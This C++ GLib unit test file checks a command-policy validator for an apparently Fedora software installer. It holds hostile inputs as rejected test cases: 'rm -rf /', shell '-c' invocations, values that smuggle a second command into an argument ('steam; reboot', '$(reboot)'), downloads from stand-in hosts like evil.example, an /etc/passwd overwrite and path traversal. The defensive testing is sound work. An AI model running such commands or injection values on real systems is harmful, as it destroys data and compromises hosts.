#include "core/policy.h"

#include <glib.h>

#include <string>
#include <vector>

using namespace loadout;

namespace {

bool allowed(const std::string &program, const std::vector<std::string> &args,
             const std::string &expectedUser = {})
{
    std::string error;
    return policy::validate(program, args, error, expectedUser);
}

void allowsTheInstallPlan()
{
    g_assert_true(allowed("/usr/bin/dnf", {"-y", "install", "steam"}));
    g_assert_true(allowed("/usr/bin/dnf",
                          {"-y", "install", "curl", "wget2-wget", "git", "dnf5-plugins"}));
    g_assert_true(allowed("/usr/bin/dnf", {"swap", "-y", "ffmpeg-free", "ffmpeg",
                                           "--allowerasing"}));
    g_assert_true(allowed("/usr/bin/dnf", {"copr", "enable", "-y", "imput/helium"}));
    g_assert_true(allowed("/usr/bin/dnf", {"config-manager", "addrepo", "--from-repofile",
                                           "/run/lgl-a1B2c3/brave-browser.repo"}));
    g_assert_true(allowed("/usr/bin/flatpak",
                          {"install", "-y", "--system", "flathub", "com.vysp3r.ProtonPlus"}));
    g_assert_true(allowed("/usr/bin/systemctl", {"reboot"}));
    g_assert_true(allowed("/usr/sbin/usermod", {"-aG", "libvirt", "tester"}));
    g_assert_true(allowed("/usr/bin/sudo", {"-u", "tester", "/usr/bin/pipx", "install",
                                            "--include-deps", "yt-dlp"}));
}

void rejectsShellInvocations()
{
    g_assert_false(allowed("/bin/sh", {"-c", "id"}));
    g_assert_false(allowed("/usr/bin/bash", {"-c", "id"}));
}

void rejectsUnknownProgramsAndFlags()
{
    g_assert_false(allowed("/usr/bin/rm", {"-rf", "/"}));
    g_assert_false(allowed("/usr/bin/dnf", {"-y", "install", "steam", "--enablerepo=evil"}));
    g_assert_false(allowed("/usr/bin/dnf", {"remove", "steam"}));
    g_assert_false(allowed("/usr/bin/flatpak",
                           {"install", "-y", "--user", "flathub", "com.google.Chrome"}));
}

void rejectsInjectedArguments()
{
    g_assert_false(allowed("/usr/bin/dnf", {"-y", "install", "steam; reboot"}));
    g_assert_false(allowed("/usr/bin/dnf", {"-y", "install", "$(reboot)"}));
    g_assert_false(allowed("/usr/bin/dnf", {"-y", "install", "steam\nreboot"}));
    g_assert_false(allowed("/usr/bin/dnf",
                           {"-y", "install", "https://evil.example/x.rpm --nogpgcheck"}));
    g_assert_false(allowed("/usr/bin/curl", {"-fsSL", "-o", "/etc/passwd",
                                             "https://example.com/x"}));
    g_assert_false(allowed("/usr/sbin/usermod", {"-aG", "libvirt", "root"}));
    g_assert_false(allowed("/usr/sbin/usermod", {"-aG", "libvirt", "Tester"}));

    // Values that start with a hyphen are dnf/rpm/flatpak options, not names.
    for (const char *option : {"--nogpgcheck", "--allowerasing", "--skip-broken", "-x", "-y"})
        g_assert_false(allowed("/usr/bin/dnf", {"-y", "install", option}));
    g_assert_false(allowed("/usr/bin/dnf", {"-y", "install", ".rpm"}));
    g_assert_false(allowed("/usr/bin/dnf", {"-y", "install", ".."}));
    g_assert_false(allowed("/usr/bin/rpm", {"-q", "--quiet", "--nodeps"}));
    g_assert_false(allowed("/usr/bin/flatpak",
                           {"install", "-y", "--system", "flathub", "--user"}));
}

void rejectsUnlistedSources()
{
    g_assert_false(allowed("/usr/bin/dnf", {"copr", "enable", "-y", "evil/repo"}));
    g_assert_false(allowed("/usr/bin/dnf", {"copr", "enable", "-y",
                                            "linuxgamerlife/unknown"}));
    g_assert_false(allowed("/usr/bin/curl",
                           {"-fsSL", "-o", "/run/lgl-abc/repo",
                            "https://evil.example/repo"}));
    g_assert_false(allowed("/usr/bin/curl",
                           {"-fsSL", "-o", "/run/lgl-abc/repo",
                            "https://download1.rpmfusion.org.evil.example/repo"}));
    g_assert_false(allowed("/usr/bin/curl",
                           {"-fsSL", "-o", "/run/lgl-abc/repo",
                            "https://user@download1.rpmfusion.org/repo"}));
    g_assert_true(allowed("/usr/bin/curl",
                          {"-fsSL", "-o", "/run/lgl-abc/repo",
                           "https://repo.vivaldi.com/archive/vivaldi-fedora.repo"}));
}

void bindsUserOperationsToTheCaller()
{
    g_assert_true(allowed("/usr/sbin/usermod", {"-aG", "libvirt", "tester"}, "tester"));
    g_assert_false(allowed("/usr/sbin/usermod", {"-aG", "libvirt", "victim"}, "tester"));
    g_assert_true(allowed("/usr/bin/sudo",
                          {"-u", "tester", "/usr/bin/pipx", "install", "--include-deps",
                           "tldr"},
                          "tester"));
    g_assert_false(allowed("/usr/bin/sudo",
                           {"-u", "victim", "/usr/bin/pipx", "install", "--include-deps",
                            "tldr"},
                           "tester"));
    g_assert_false(allowed("/usr/bin/sudo",
                           {"-u", "tester", "/usr/bin/pipx", "install", "--include-deps",
                            "requests"},
                           "tester"));
}

void rejectsPathTraversalInRunFiles()
{
    g_assert_false(allowed("/usr/bin/dnf", {"config-manager", "addrepo", "--from-repofile",
                                            "/run/lgl-abc/../../etc/repo"}));
    g_assert_false(allowed("/usr/bin/curl", {"-fsSL", "-o", "/run/lgl-abc/../x",
                                             "https://example.com/x"}));
}

void keepsSudoScopedToPipx()
{
    g_assert_false(allowed("/usr/bin/sudo", {"-u", "tester", "/usr/bin/dnf", "install", "steam"}));
    g_assert_false(allowed("/usr/bin/sudo", {"-u", "tester", "rm", "-rf", "/"}));
    g_assert_false(allowed("/usr/bin/sudo", {"-u", "tester", "/usr/bin/pipx", "install",
                                             "--include-deps", "tldr; reboot"}));
}

void acceptsEveryCoprRepoUsedByThePlan()
{
    g_assert_true(allowed("/usr/bin/dnf", {"copr", "enable", "-y",
                                           "atim/heroic-games-launcher"}));
    g_assert_true(allowed("/usr/bin/dnf", {"copr", "enable", "-y",
                                           "linuxgamerlife/lgl-toolkit"}));
    g_assert_true(allowed("/usr/bin/dnf", {"copr", "enable", "-y",
                                           "bieszczaders/kernel-cachyos-addons"}));
}

} // namespace

int main(int argc, char **argv)
{
    g_test_init(&argc, &argv, nullptr);
    g_test_add_func("/policy/plan", allowsTheInstallPlan);
    g_test_add_func("/policy/no-shell", rejectsShellInvocations);
    g_test_add_func("/policy/unknown", rejectsUnknownProgramsAndFlags);
    g_test_add_func("/policy/injection", rejectsInjectedArguments);
    g_test_add_func("/policy/sources", rejectsUnlistedSources);
    g_test_add_func("/policy/user-scope", bindsUserOperationsToTheCaller);
    g_test_add_func("/policy/traversal", rejectsPathTraversalInRunFiles);
    g_test_add_func("/policy/sudo", keepsSudoScopedToPipx);
    g_test_add_func("/policy/copr", acceptsEveryCoprRepoUsedByThePlan);
    return g_test_run();
}
